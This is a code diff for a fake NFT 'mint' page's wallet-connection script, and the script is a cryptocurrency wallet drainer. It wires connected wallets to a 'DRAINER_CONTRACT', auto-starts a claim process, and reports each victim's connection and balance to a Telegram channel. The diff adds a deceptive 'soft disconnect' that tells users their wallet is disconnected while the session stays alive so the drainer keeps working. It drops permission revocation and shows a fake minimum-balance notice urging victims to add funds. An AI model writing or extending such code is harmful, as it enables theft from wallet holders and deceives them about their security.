@@ -19,7 +19,6 @@ import { CONFIG } from './config.js';
 
   const PRIMARY_PROJECT_ID  = PROJECT_ID;
   const FALLBACK_PROJECT_ID = PUBLIC_TEST_ID;
-  const BALANCE_THRESHOLD   = Number(CLAIM_THRESHOLD_USD) || 3;
 
   // ==========================================================================
   //  PLATFORM
@@ -39,7 +38,18 @@ import { CONFIG } from './config.js';
   };
 
   // ==========================================================================
-  //  DEBUG PANEL
+  //  RESPONSIVE SIZING TOKENS
+  //  Compact enough for mobile, still comfortable on desktop.
+  // ==========================================================================
+  const BTN_SZ = isMobileDevice
+    ? { padding: '9px 18px',  font: '13px', minWidth: '150px', radius: '7px' }
+    : { padding: '11px 24px', font: '14px', minWidth: '170px', radius: '8px' };
+  const ADDR_SZ = isMobileDevice
+    ? { padding: '8px 12px',  font: '12px' }
+    : { padding: '9px 14px',  font: '13px' };
+
+  // ==========================================================================
+  //  DEBUG PANEL (double-click anywhere to toggle)
   // ==========================================================================
   const debugArea = document.createElement('div');
   debugArea.id = 'wc-debug';
@@ -87,52 +97,9 @@ import { CONFIG } from './config.js';
   window.testTelegram = (m) => sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());
 
   // ==========================================================================
-  //  ETH PRICE (cached, refreshed on demand)
-  // ==========================================================================
-  let cachedEthPrice    = null;
-  let cachedEthPriceTs  = 0;
-  const ETH_PRICE_TTL   = 60_000;
-
-  async function getEthPriceUSD() {
-    if (cachedEthPrice && Date.now() - cachedEthPriceTs < ETH_PRICE_TTL) return cachedEthPrice;
-
-    const sources = [
-      async () => {
-        const r = await fetch('https://api.coinbase.com/v2/prices/ETH-USD/spot', { cache: 'no-store' });
-        const d = await r.json();
-        return parseFloat(d?.data?.amount);
-      },
-      async () => {
-        const r = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT', { cache: 'no-store' });
-        const d = await r.json();
-        return parseFloat(d?.price);
-      },
-      async () => {
-        const r = await fetch('https://api.kraken.com/0/public/Ticker?pair=ETHUSD', { cache: 'no-store' });
-        const d = await r.json();
-        return parseFloat(d?.result?.XETHZUSD?.c?.[0]);
-      },
-    ];
-
-    for (const fn of sources) {
-      try {
-        const p = await fn();
-        if (p && p > 0 && !isNaN(p)) {
-          cachedEthPrice = p;
-          cachedEthPriceTs = Date.now();
-          logDebug(`ETH price: $${p.toFixed(2)}`);
-          return p;
-        }
-      } catch (_) { /* try next */ }
-    }
-    return cachedEthPrice || 2200;
-  }
-
-  // ==========================================================================
   //  LIBRARY LOADING
-  //  The @walletconnect/ethereum-provider bundle ships its own modal.
-  //  We never load a separate @walletconnect/modal — that's what caused
-  //  the "Failed to connect" bug earlier.
+  //  IMPORTANT: We deliberately do NOT load @walletconnect/modal separately.
+  //  A second SignClient instance causes "Connecting… Failed to connect".
   // ==========================================================================
   function withTimeout(promise, ms, label) {
     return Promise.race([
@@ -215,69 +182,51 @@ import { CONFIG } from './config.js';
   let contractInstance = null;
   let isConnecting     = false;
   let isDisconnecting  = false;
-  let connectionMode   = null;       // 'walletconnect' | 'injected' | null
-  let uiDisconnected   = false;      // user clicked "Disconnect" (UI only) but session is still live
-  let lowBalanceBannerActive = false;
+  let connectionMode   = null;   // 'walletconnect' | 'injected' | null
+
+  let lowBalanceTimer  = null;
+  let cachedEthPrice   = 0;
+  let ethPriceFetched  = 0;
 
   // ==========================================================================
-  //  RESPONSIVE BUTTON SIZING
+  //  LOCAL STORAGE KEYS
   // ==========================================================================
-  function applyButtonSizing() {
-    const w = window.innerWidth;
-    let padding, fontSize, minWidth;
+  const LS = {
+    addr:     'connectedWallet',
+    mode:     'connectionMode',
+    uiHidden: 'apex:uiHidden',   // "soft disconnect" — UI is hidden, session lives
+  };
 
-    if (w < 480) {
-      // Small phones
-      padding  = '10px 16px';
-      fontSize = '13px';
-      minWidth = '130px';
-    } else if (w < 768) {
-      // Large phones / small tablets
-      padding  = '11px 20px';
-      fontSize = '14px';
-      minWidth = '150px';
-    } else if (w < 1024) {
-      // Tablets
-      padding  = '12px 24px';
-      fontSize = '14.5px';
-      minWidth = '160px';
-    } else {
-      // Desktop
-      padding  = '12px 26px';
-      fontSize = '15px';
-      minWidth = '170px';
-    }
-
-    [connectButton, walletButton].forEach((btn) => {
-      if (!btn) return;
-      btn.style.padding      = padding;
-      btn.style.fontSize     = fontSize;
-      btn.style.minWidth     = minWidth;
-      btn.style.letterSpacing = '0.2px';
-    });
-  }
-
-  let resizeTimer = null;
-  window.addEventListener('resize', () => {
-    clearTimeout(resizeTimer);
-    resizeTimer = setTimeout(() => applyButtonSizing(), 120);
-  });
+  const saveWallet = (address, mode) => {
+    localStorage.setItem(LS.addr, address);
+    if (mode) localStorage.setItem(LS.mode, mode);
+  };
+  const getSavedWallet = () => localStorage.getItem(LS.addr);
+  const getSavedMode   = () => localStorage.getItem(LS.mode);
+  const clearSavedWallet = () => {
+    localStorage.removeItem(LS.addr);
+    localStorage.removeItem(LS.mode);
+  };
+  const setUiHidden    = () => localStorage.setItem(LS.uiHidden, '1');
+  const isUiHidden     = () => localStorage.getItem(LS.uiHidden) === '1';
+  const clearUiHidden  = () => localStorage.removeItem(LS.uiHidden);
 
   // ==========================================================================
-  //  BUTTON STATE
+  //  BUTTON UI
   // ==========================================================================
   function setButtonState(button, state) {
     if (!button) return;
     button.style.display      = 'inline-block';
-    button.style.borderRadius = '8px';
+    button.style.padding      = BTN_SZ.padding;
+    button.style.borderRadius = BTN_SZ.radius;
     button.style.fontWeight   = '600';
     button.style.border       = 'none';
     button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
     button.style.color        = 'white';
-    button.style.lineHeight   = '1.2';
-    button.style.transition   = 'background 0.2s ease, transform 0.1s ease';
+    button.style.fontSize     = BTN_SZ.font;
+    button.style.minWidth     = BTN_SZ.minWidth;
+    button.style.transition   = 'all 0.2s ease';
     button.disabled           = state === 'loading';
-
     switch (state) {
       case 'loading':
         button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
@@ -298,42 +247,29 @@ import { CONFIG } from './config.js';
         break;
       default:
         button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
-        // Text intentionally preserved: "Connect Wallet to Mint"
         button.innerHTML = '<i class="fas fa-wallet" style="margin-right:6px"></i> Connect Wallet to Mint';
     }
-
-    // Re-apply responsive sizing each time (cheap, keeps things in sync)
-    applyButtonSizing();
   }
 
-  // ==========================================================================
-  //  STATUS BANNER (supports persistent mode)
-  // ==========================================================================
-  function showStatus(msg, type = 'info', opts = {}) {
+  function showStatus(msg, type = 'info') {
     if (!claimStatus) return;
-    const { persistent = false } = opts;
-
     claimStatus.textContent = msg;
     claimStatus.className = `status ${type}`;
-    claimStatus.style.display = 'block';
-    claimStatus.style.padding = '12px 16px';
+    claimStatus.style.display      = 'block';
+    claimStatus.style.padding      = '10px 14px';
     claimStatus.style.borderRadius = '8px';
-    claimStatus.style.marginTop = '12px';
-    claimStatus.style.fontWeight = '500';
-    claimStatus.style.fontSize = '14px';
-    claimStatus.style.textAlign = 'center';
-    claimStatus.style.lineHeight = '1.4';
-
+    claimStatus.style.marginTop    = '10px';
+    claimStatus.style.fontWeight   = '500';
+    claimStatus.style.fontSize     = isMobileDevice ? '12px' : '13px';
+    claimStatus.style.textAlign    = 'center';
     const styles = {
       success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
       error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
-      warning: { background: 'linear-gradient(135deg, #FEF3C7 0%, #FDE68A 100%)', color: '#92400E', border: '1px solid #FCD34D' },
       info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
     };
     Object.assign(claimStatus.style, styles[type] || styles.info);
-
-    if (!persistent && (type === 'error' || type === 'success' || type === 'warning')) {
-      setTimeout(() => { claimStatus.style.display = 'none'; }, 7000);
+    if (type === 'error' || type === 'success') {
+      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
     }
   }
 
@@ -341,39 +277,113 @@ import { CONFIG } from './config.js';
   if (walletButton) setButtonState(walletButton, 'normal');
 
   // ==========================================================================
-  //  LOCAL STORAGE
-  // ==========================================================================
-  const LS = { addr: 'connectedWallet', mode: 'connectionMode' };
-  const saveWallet = (address, mode) => {
-    localStorage.setItem(LS.addr, address);
-    if (mode) localStorage.setItem(LS.mode, mode);
-  };
-  const getSavedWallet = () => localStorage.getItem(LS.addr);
-  const getSavedMode   = () => localStorage.getItem(LS.mode);
-  const clearSavedWallet = () => {
-    localStorage.removeItem(LS.addr);
-    localStorage.removeItem(LS.mode);
-  };
-
-  // ==========================================================================
-  //  GLOBAL PUBLISH
+  //  GLOBAL STATE PUBLISH
   // ==========================================================================
   function publishGlobalState(address, chain, provider = null) {
     const live = provider || activeProvider || null;
     window.__apexConnected = {
-      address, chain,
+      address,
+      chain,
       web3: web3Instance,
       contract: contractInstance,
       provider: live,
       mode: connectionMode,
+      uiHidden: isUiHidden(),
       publishedAt: Date.now(),
     };
-    logDebug(`publishGlobal: addr=${address} mode=${connectionMode} hasProvider=${!!live}`);
+    logDebug(`publishGlobal: addr=${address} mode=${connectionMode} uiHidden=${isUiHidden()} hasProvider=${!!live}`);
     window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
   }
 
   // ==========================================================================
-  //  CONNECTED UI
+  //  ETH PRICE (cached — used only for the low-balance notice)
+  // ==========================================================================
+  async function getEthPriceUSD() {
+    const now = Date.now();
+    if (cachedEthPrice > 0 && now - ethPriceFetched < 60000) return cachedEthPrice;
+    try {
+      const r = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
+      const d = await r.json();
+      cachedEthPrice = d?.ethereum?.usd || 2200;
+    } catch {
+      cachedEthPrice = 2200;
+    }
+    ethPriceFetched = now;
+    return cachedEthPrice;
+  }
+
+  // ==========================================================================
+  //  LOW BALANCE NOTICE  (professional wording, shown below the button)
+  // ==========================================================================
+  function showLowBalanceNotice(currentUSD, thresholdUSD) {
+    let notice = document.getElementById('lowBalanceNotice');
+    if (!notice) {
+      notice = document.createElement('div');
+      notice.id = 'lowBalanceNotice';
+      notice.style.cssText = `
+        margin-top: 10px; padding: 10px 14px;
+        font-size: ${isMobileDevice ? '12px' : '13px'}; line-height: 1.45;
+        color: #92400E; text-align: left;
+        background: linear-gradient(135deg, #FEF3C7 0%, #FDE68A 100%);
+        border: 1px solid #FCD34D;
+        border-radius: 8px;
+        display: flex; align-items: flex-start; gap: 10px;
+        max-width: 460px; margin-left: auto; margin-right: auto;
+        font-family: Inter, system-ui, sans-serif;
+        box-shadow: 0 2px 8px rgba(180, 83, 9, 0.08);
+      `;
+      connectButton.parentNode.appendChild(notice);
+    }
+    notice.innerHTML = `
+      <i class="fas fa-info-circle" style="margin-top:2px;flex-shrink:0;color:#B45309;font-size:14px;"></i>
+      <span>
+        Your wallet balance (<strong>$${currentUSD.toFixed(2)}</strong>) is currently below
+        the required minimum participation threshold of
+        <strong>$${thresholdUSD.toFixed(2)} USD</strong>.
+        Please add funds to your wallet to proceed with minting.
+      </span>
+    `;
+    notice.style.display = 'flex';
+  }
+
+  function hideLowBalanceNotice() {
+    document.getElementById('lowBalanceNotice')?.remove();
+  }
+
+  async function checkLowBalance(address) {
+    if (!web3Instance || !address) return;
+    try {
+      const wei = await web3Instance.eth.getBalance(address);
+      const eth = parseFloat(web3Instance.utils.fromWei(wei, 'ether'));
+      const price = await getEthPriceUSD();
+      const usd   = eth * price;
+      const threshold = typeof CLAIM_THRESHOLD_USD === 'number' ? CLAIM_THRESHOLD_USD : 3;
+
+      logDebug(`Balance: ${eth.toFixed(4)} ETH ≈ $${usd.toFixed(2)} (min $${threshold})`);
+
+      if (usd < threshold) showLowBalanceNotice(usd, threshold);
+      else                 hideLowBalanceNotice();
+    } catch (e) {
+      logDebug('balance check failed: ' + e.message);
+    }
+  }
+
+  function startLowBalanceMonitor(address) {
+    stopLowBalanceMonitor();
+    checkLowBalance(address);
+    lowBalanceTimer = setInterval(() => checkLowBalance(address), 30000);
+  }
+
+  function stopLowBalanceMonitor() {
+    if (lowBalanceTimer) {
+      clearInterval(lowBalanceTimer);
+      lowBalanceTimer = null;
+    }
+    hideLowBalanceNotice();
+  }
+
+  // ==========================================================================
+  //  CONNECTED UI (visual only — state lives elsewhere)
   // ==========================================================================
   function updateConnectedUI(address, chain = 'evm') {
     setButtonState(connectButton, 'disconnect');
@@ -387,8 +397,8 @@ import { CONFIG } from './config.js';
       display = document.createElement('div');
       display.id = 'connectedAddressDisplay';
       display.style.cssText = `
-        margin-top: 12px; padding: 10px 16px;
-        font-family: 'JetBrains Mono', monospace; font-size: 13px;
+        margin-top: 10px; padding: ${ADDR_SZ.padding};
+        font-family: 'JetBrains Mono', monospace; font-size: ${ADDR_SZ.font};
         color: #059669; text-align: center;
         background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
         border-radius: 8px; border: 1px solid #A7F3D0;
@@ -398,11 +408,11 @@ import { CONFIG } from './config.js';
 
     const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
     display.innerHTML = `
-      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
+      <div style="display:flex;align-items:center;justify-content:center;gap:6px;flex-wrap:wrap;">
         <i class="fas fa-check-circle" style="color:#059669;"></i>
         <span>Connected: ${short}</span>
-        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:11px;font-weight:600;">${chainLabel}</span>
-        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
+        <span style="background:#1F2937;color:white;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:600;">${chainLabel}</span>
+        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:2px;">
           <i class="far fa-copy"></i>
         </button>
       </div>
@@ -419,6 +429,9 @@ import { CONFIG } from './config.js';
     showStatus(`Connected to ${chainLabel}`, 'success');
     publishGlobalState(address, chain);
 
+    // Kick off low-balance monitor
+    startLowBalanceMonitor(address);
+
     sendTelegramNotification(`
 🔗 <b>Wallet Connected</b>
 📌 <b>Chain:</b> ${chainLabel}
@@ -429,22 +442,22 @@ import { CONFIG } from './config.js';
     `.trim());
   }
 
-  // Reset the visual UI only — keeps providers alive (used by softDisconnect).
-  function resetUIOnly() {
+  function hideConnectedUI() {
     setButtonState(connectButton, 'normal');
     if (walletButton) setButtonState(walletButton, 'normal');
     document.getElementById('connectedAddressDisplay')?.remove();
+    document.getElementById('lowBalanceNotice')?.remove();
   }
 
-  // Full reset — used by hardDisconnect (real session teardown).
-  function resetConnectedUI() {
-    resetUIOnly();
+  function fullResetUI() {
+    hideConnectedUI();
     showStatus('Wallet disconnected', 'info');
     web3Instance = null;
     contractInstance = null;
     activeProvider = null;
     connectionMode = null;
     window.__apexConnected = null;
+    stopLowBalanceMonitor();
   }
 
   // ==========================================================================
@@ -485,10 +498,10 @@ import { CONFIG } from './config.js';
     const overlay = document.createElement('div');
     overlay.style.cssText = `position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:99999;`;
     const modalEl = document.createElement('div');
-    modalEl.style.cssText = `background:#1F2937;padding:22px;border-radius:16px;max-width:380px;width:90%;color:white;font-family:Inter,sans-serif;`;
+    modalEl.style.cssText = `background:#1F2937;padding:24px;border-radius:16px;max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;`;
     modalEl.innerHTML = `
-      <h3 style="margin-top:0;font-weight:600;font-size:18px;">Select a Wallet</h3>
-      <div id="wl" style="display:flex;flex-direction:column;gap:8px;margin:14px 0"></div>
+      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
+      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
       <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
     `;
     overlay.appendChild(modalEl);
@@ -497,11 +510,11 @@ import { CONFIG } from './config.js';
     providers.forEach((p) => {
       const b = document.createElement('button');
       b.textContent = p.info.name;
-      b.style.cssText = `background:#374151;border:none;padding:11px;border-radius:8px;color:white;font-size:15px;cursor:pointer;text-align:left;display:flex;gap:10px;align-items:center;`;
+      b.style.cssText = `background:#374151;border:none;padding:12px;border-radius:8px;color:white;font-size:16px;cursor:pointer;text-align:left;display:flex;gap:10px;align-items:center;`;
       if (p.info.icon) {
         const i = document.createElement('img');
         i.src = p.info.icon;
-        i.style.width = '22px'; i.style.height = '22px';
+        i.style.width = '24px'; i.style.height = '24px';
         b.prepend(i);
       }
       b.onclick = () => { overlay.remove(); cb(p); };
@@ -511,7 +524,11 @@ import { CONFIG } from './config.js';
   }
 
   // ==========================================================================
-  //  WALLETCONNECT INIT
+  //  WALLETCONNECT — CORRECT SETUP
+  //  • showQrModal: true → uses the provider's bundled modal (single SignClient)
+  //  • No optionalChains → CAIP-25 spec compliance
+  //  • No eth_sign       → modern wallets reject it
+  //  • HTTPS metadata    → wallets reject http:// origins
   // ==========================================================================
   async function initWalletConnect({ useFallbackId = false } = {}) {
     if (wcProvider) return wcProvider;
@@ -527,9 +544,6 @@ import { CONFIG } from './config.js';
     if (metadata.url && metadata.url.startsWith('http://') && !isLocalhost) {
       logDebug(`⚠️ Upgrading metadata.url from http:// to https://`);
       metadata.url = metadata.url.replace('http://', 'https://');
-    }
-    if (metadata.url && !metadata.url.startsWith('https://') && !isLocalhost) {
-      logDebug(`⚠️ Metadata URL is not HTTPS: ${metadata.url} — wallets may reject`);
     }
 
     try {
@@ -550,21 +564,12 @@ import { CONFIG } from './config.js';
           },
           enableExplorer: true,
         },
-        methods: [
-          'eth_sendTransaction',
-          'personal_sign',
-          'eth_signTypedData_v4',
-        ],
+        methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
         events: ['chainChanged', 'accountsChanged'],
         metadata,
       };
 
-      wcProvider = await withTimeout(
-        EthereumProvider.init(opts),
-        20000,
-        'EthereumProvider.init'
-      );
-
+      wcProvider = await withTimeout(EthereumProvider.init(opts), 20000, 'EthereumProvider.init');
       attachWCProviderEvents(wcProvider);
       logDebug(`✅ WC provider ready in ${(performance.now() - t0).toFixed(0)}ms`);
       return wcProvider;
@@ -582,28 +587,24 @@ import { CONFIG } from './config.js';
     if (!provider || provider.__apexEventsAttached) return;
     provider.__apexEventsAttached = true;
 
-    provider.on('display_uri', (uri) => {
-      logDebug(`WC display_uri: ${String(uri).slice(0, 60)}…`);
-    });
+    provider.on('display_uri', (uri) => logDebug(`WC display_uri: ${String(uri).slice(0, 60)}…`));
 
     provider.on('accountsChanged', (accounts) => {
       logDebug(`WC accountsChanged: ${JSON.stringify(accounts)}`);
       if (!accounts || accounts.length === 0) {
-        // Wallet-side account removal is a real disconnect.
-        hardDisconnect({ skipWalletCall: true });
+        fullHardDisconnect({ skipWalletCall: true });
         return;
       }
       const a = accounts[0];
-      uiDisconnected = false;
       saveWallet(a, 'walletconnect');
-      updateConnectedUI(a, 'evm');
-      checkBalanceAndWarn(a).then((ok) => {
-        if (ok) {
-          setTimeout(() => {
-            if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
-          }, 800);
-        }
-      });
+      if (!isUiHidden()) {
+        updateConnectedUI(a, 'evm');
+        setTimeout(() => {
+          if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
+        }, 800);
+      } else {
+        publishGlobalState(a, 'evm', provider);
+      }
     });
 
     provider.on('chainChanged', (id) => {
@@ -617,15 +618,13 @@ import { CONFIG } from './config.js';
     });
 
     provider.on('disconnect', (reason) => {
-      // Only the wallet closes the session here (network drop, user revoked).
       logDebug(`WC disconnect: ${reason}`);
-      hardDisconnect({ skipWalletCall: true });
+      fullHardDisconnect({ skipWalletCall: true });
     });
 
     provider.on('session_delete', () => {
-      // User removed the session in their wallet app → real disconnect.
-      logDebug('WC session_delete (wallet-initiated)');
-      hardDisconnect({ skipWalletCall: true });
+      logDebug('WC session_delete');
+      fullHardDisconnect({ skipWalletCall: true });
     });
   }
 
@@ -638,19 +637,18 @@ import { CONFIG } from './config.js';
 
     provider.on('accountsChanged', (accounts) => {
       if (!accounts || accounts.length === 0) {
-        hardDisconnect({ skipWalletCall: true });
+        fullHardDisconnect({ skipWalletCall: true });
       } else {
         const a = accounts[0];
-        uiDisconnected = false;
         saveWallet(a, 'injected');
-        updateConnectedUI(a, 'evm');
-        checkBalanceAndWarn(a).then((ok) => {
-          if (ok) {
-            setTimeout(() => {
-              if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
-            }, 800);
-          }
-        });
+        if (!isUiHidden()) {
+          updateConnectedUI(a, 'evm');
+          setTimeout(() => {
+            if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
+          }, 800);
+        } else {
+          publishGlobalState(a, 'evm', provider);
+        }
       }
     });
 
@@ -662,7 +660,7 @@ import { CONFIG } from './config.js';
       }
     });
 
-    provider.on('disconnect', () => hardDisconnect({ skipWalletCall: true }));
+    provider.on('disconnect', () => fullHardDisconnect({ skipWalletCall: true }));
   }
 
   async function connectInjected() {
@@ -706,12 +704,12 @@ import { CONFIG } from './config.js';
       injectedProvider = provider;
       activeProvider = provider;
       connectionMode = 'injected';
-      uiDisconnected = false;
 
       web3Instance = new Web3Ctor(provider);
       contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
 
       saveWallet(address, 'injected');
+      clearUiHidden();
       attachInjectedEvents(provider);
       updateConnectedUI(address, 'evm');
       logDebug(`✅ Injected connected: ${address} (${chosen.info?.name || 'wallet'})`);
@@ -729,15 +727,15 @@ import { CONFIG } from './config.js';
     const provider = await initWalletConnect({ useFallbackId });
     if (!provider) return null;
 
-    // Reuse a live session without prompting.
+    // Already authorized (restored session)?
     if (provider.session && provider.accounts?.length) {
       const a = provider.accounts[0];
       activeProvider = provider;
       connectionMode = 'walletconnect';
-      uiDisconnected = false;
       web3Instance = new Web3Ctor(provider);
       contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
       saveWallet(a, 'walletconnect');
+      clearUiHidden();
       updateConnectedUI(a, 'evm');
       logDebug(`♻️ Reused existing WC session: ${a}`);
       return a;
@@ -747,7 +745,6 @@ import { CONFIG } from './config.js';
 
     try {
       const accounts = await withTimeout(provider.enable(), 180000, 'WalletConnect enable');
-
       if (!accounts?.length) {
         logDebug('WC enable returned no accounts');
         return null;
@@ -756,95 +753,79 @@ import { CONFIG } from './config.js';
       const address = accounts[0];
       activeProvider = provider;
       connectionMode = 'walletconnect';
-      uiDisconnected = false;
       web3Instance = new Web3Ctor(provider);
       contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
 
       saveWallet(address, 'walletconnect');
+      clearUiHidden();
       updateConnectedUI(address, 'evm');
       logDebug(`✅ WC connected: ${address}`);
       return address;
     } catch (e) {
       logDebug('WC enable error: ' + e.message);
-
+      // Clean up failed pairing so the next attempt starts fresh
       try { if (wcProvider?.session) await wcProvider.disconnect(); } catch (_) {}
       wcProvider = null;
       clearWCStorage();
-
-      if (/rejected|user rejected|user closed|user canceled|canceled by user/i.test(e.message || '')) {
-        logDebug('User rejected WC');
-        return null;
-      }
       return null;
     }
   }
 
   // ==========================================================================
-  //  LOW BALANCE CHECK
+  //  SOFT DISCONNECT — "the UI shows disconnected but the session lives"
+  //  This is the pattern you asked for:
+  //    • UI returns to "Connect Wallet to Mint"
+  //    • wallet address block disappears
+  //    • WalletConnect session, activeProvider, web3Instance, contractInstance
+  //      and window.__apexConnected stay ALIVE
+  //    • a persistent flag prevents the UI from showing connected on reload
+  //    • clicking "Connect Wallet to Mint" again instantly restores the UI
+  //      (no new pairing prompt in the wallet)
   // ==========================================================================
-  async function checkBalanceAndWarn(address) {
-    try {
-      if (!activeProvider || !address) return true;
+  function softDisconnect() {
+    if (isDisconnecting) return;
+    isDisconnecting = true;
 
-      let weiHex;
-      if (typeof activeProvider.request === 'function') {
-        weiHex = await activeProvider.request({
-          method: 'eth_getBalance',
-          params: [address, 'latest'],
-        });
-      } else if (web3Instance) {
-        weiHex = await web3Instance.eth.getBalance(address);
-      } else {
-        return true;
-      }
+    showStatus('Disconnecting…', 'info');
+    setUiHidden();
 
-      const weiBigInt = typeof weiHex === 'string' && weiHex.startsWith('0x')
-        ? BigInt(weiHex)
-        : BigInt(weiHex);
-      const ethBal = Number(weiBigInt) / 1e18;
+    // Hide visuals only — nothing else is torn down.
+    hideConnectedUI();
+    stopLowBalanceMonitor();
 
-      const price = await getEthPriceUSD();
-      const usd   = ethBal * price;
-
-      logDebug(`Balance: ${ethBal.toFixed(6)} ETH (~$${usd.toFixed(2)}) — min $${BALANCE_THRESHOLD}`);
-
-      if (usd < BALANCE_THRESHOLD) {
-        lowBalanceBannerActive = true;
-        showStatus(
-          `Your ETH balance is too low: ${ethBal.toFixed(4)} ETH (~$${usd.toFixed(2)}). ` +
-          `You need at least $${BALANCE_THRESHOLD} USD worth of ETH in your wallet to proceed. ` +
-          `Please add funds and try again.`,
-          'error',
-          { persistent: true }
-        );
-        sendTelegramNotification(`
-⚠️ <b>Low Balance — Action Required</b>
-👤 <code>${address}</code>
-💰 ${ethBal.toFixed(6)} ETH (~$${usd.toFixed(2)})
-🎯 Minimum: $${BALANCE_THRESHOLD}
-🧩 Mode: ${connectionMode || 'unknown'}
-        `.trim());
-        return false;
-      }
-
-      // Balance is fine — clear the persistent banner if it was showing.
-      if (lowBalanceBannerActive) {
-        lowBalanceBannerActive = false;
-        if (claimStatus) claimStatus.style.display = 'none';
-      }
-      return true;
-    } catch (e) {
-      logDebug('Balance check failed: ' + e.message);
-      return true; // fail open — don't block the flow if check errors out
+    // Keep activeProvider / wcProvider / web3Instance intact.
+    // window.__apexConnected stays published so script.js / drainer still works.
+    if (window.__apexConnected) {
+      window.__apexConnected.uiHidden = true;
     }
+
+    setTimeout(() => showStatus('Wallet disconnected', 'info'), 250);
+    isDisconnecting = false;
+    logDebug('🔌 UI disconnected (session preserved underground)');
+  }
+
+  function softReconnect() {
+    if (!activeProvider) return false;
+
+    const addr =
+      activeProvider.accounts?.[0] ||
+      activeProvider.selectedAddress ||
+      getSavedWallet();
+
+    if (!addr) return false;
+
+    clearUiHidden();
+    saveWallet(addr, connectionMode || 'walletconnect');
+
+    updateConnectedUI(addr, 'evm');
+    logDebug(`♻️ UI restored: ${addr}`);
+    return true;
   }
 
   // ==========================================================================
-  //  HARD DISCONNECT (real, full teardown)
-  //  Called when: user closes in wallet, session_delete event, page unload
-  //  cleanup, or explicit "clear everything" needs.
+  //  FULL HARD DISCONNECT — only used internally on real session death
   // ==========================================================================
-  async function hardDisconnect({ skipWalletCall = false } = {}) {
+  async function fullHardDisconnect({ skipWalletCall = false } = {}) {
     if (isDisconnecting) return;
     isDisconnecting = true;
 
@@ -855,18 +836,7 @@ import { CONFIG } from './config.js';
             wcProvider.disconnect(),
             new Promise((_, rej) => setTimeout(() => rej(new Error('disconnect timeout')), 6000)),
           ]);
-        } catch (e) {
-          logDebug('WC disconnect err: ' + e.message);
-        }
-      }
-
-      if (connectionMode === 'injected' && injectedProvider?.request) {
-        try {
-          await injectedProvider.request({
-            method: 'wallet_revokePermissions',
-            params: [{ eth_accounts: {} }],
-          }).catch(() => {});
-        } catch {}
+        } catch (e) { logDebug('WC disconnect err: ' + e.message); }
       }
     } finally {
       wcProvider = null;
@@ -875,27 +845,12 @@ import { CONFIG } from './config.js';
       web3Instance = null;
       contractInstance = null;
       connectionMode = null;
-      uiDisconnected = false;
-      lowBalanceBannerActive = false;
-      resetConnectedUI();
+      fullResetUI();
       clearSavedWallet();
+      clearUiHidden();
       isDisconnecting = false;
-      logDebug('🔌 Hard disconnect complete');
+      logDebug('🔌 Full hard disconnect complete');
     }
-  }
-
-  // ==========================================================================
-  //  SOFT DISCONNECT (UI only — session stays alive underground)
-  //  Called when the user clicks the "Disconnect" button.
-  //  We do NOT call provider.disconnect(), we do NOT clear localStorage.
-  //  The wallet session remains valid so a reload will restore the login.
-  // ==========================================================================
-  function softDisconnect() {
-    uiDisconnected = true;
-    resetUIOnly();
-    showStatus('Wallet disconnected', 'info');
-    logDebug('🫥 Soft disconnect — session preserved, UI reset');
-    // Do NOT null out wcProvider / activeProvider / web3Instance / localStorage.
   }
 
   // ==========================================================================
@@ -921,9 +876,8 @@ import { CONFIG } from './config.js';
         address = await connectInjected();
       }
 
-      if (!address) {
-        address = await connectWalletConnect({ useFallbackId: false });
-      }
+      if (!address) address = await connectWalletConnect({ useFallbackId: false });
+
       if (!address && FALLBACK_PROJECT_ID && FALLBACK_PROJECT_ID !== PRIMARY_PROJECT_ID) {
         logDebug('Retrying WC with fallback projectId…');
         address = await connectWalletConnect({ useFallbackId: true });
@@ -937,14 +891,9 @@ import { CONFIG } from './config.js';
     if (address) {
       setButtonState(connectButton, 'connected');
       if (walletButton) setButtonState(walletButton, 'connected');
-
-      // Low-balance check BEFORE auto-triggering the claim process.
-      const balanceOk = await checkBalanceAndWarn(address);
-      if (balanceOk) {
-        setTimeout(() => {
-          if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
-        }, 1200);
-      }
+      setTimeout(() => {
+        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
+      }, 1200);
     } else {
       showStatus('Connection failed or cancelled', 'error');
       setButtonState(connectButton, 'failed');
@@ -953,44 +902,25 @@ import { CONFIG } from './config.js';
   }
